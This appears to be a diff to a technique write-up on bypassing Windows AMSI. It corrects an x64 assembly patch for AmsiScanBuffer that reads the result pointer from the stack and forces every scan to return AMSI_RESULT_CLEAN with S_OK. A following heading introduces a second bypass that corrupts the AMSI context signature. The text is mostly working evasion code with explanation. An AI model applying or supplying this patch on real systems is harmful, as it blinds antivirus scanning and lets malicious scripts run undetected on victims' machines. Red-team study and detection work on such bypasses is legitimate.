@@ -45,15 +45,24 @@ The most reliable approach forces `*result` to a specific clean value before ret
 ```asm
 ; AmsiScanBuffer patch (x64)
 ; Function signature: AmsiScanBuffer(ctx, buf, len, name, session, *result)
-; result is the 6th argument, passed on the stack at [rsp+0x28] after the prologue
+;
+; x64 stack at function entry (before any prologue):
+;   [rsp+0x00]  return address
+;   [rsp+0x08]  shadow: RCX = amsiContext
+;   [rsp+0x10]  shadow: RDX = buffer
+;   [rsp+0x18]  shadow: R8  = length
+;   [rsp+0x20]  shadow: R9  = contentName
+;   [rsp+0x28]  5th arg   = amsiSession
+;   [rsp+0x30]  6th arg   = AMSI_RESULT* result   <── target
 
-mov dword ptr [r9], 0   ; r9 = 5th param... 
-                         ; actually result is 6th, need to read from stack
+; Read result pointer from [rsp+0x30], write AMSI_RESULT_CLEAN
+mov rax, [rsp+0x30]     ; rax = AMSI_RESULT* result
+mov dword ptr [rax], 0  ; *result = AMSI_RESULT_CLEAN
 xor eax, eax            ; return S_OK
 ret
 ```
 
-The parameter passing on x64 makes the 6th argument (`AMSI_RESULT *result`) available at `[rsp+0x28]` after accounting for the shadow space. Writing zero to `*result` before returning sets the output to `AMSI_RESULT_CLEAN` with a success `HRESULT`. The host reads `S_OK` and a clean result and proceeds with execution.
+The 6th argument (`AMSI_RESULT *result`) is at `[rsp+0x30]` at function entry, before the prologue runs. `[rsp+0x28]` is `amsiSession` (5th argument). Reading the pointer from `[rsp+0x30]` and writing zero to it sets `*result = AMSI_RESULT_CLEAN`. The function returns `S_OK` and the host proceeds with execution.
 
 ## Corrupting the AMSI_CONTEXT Signature
 
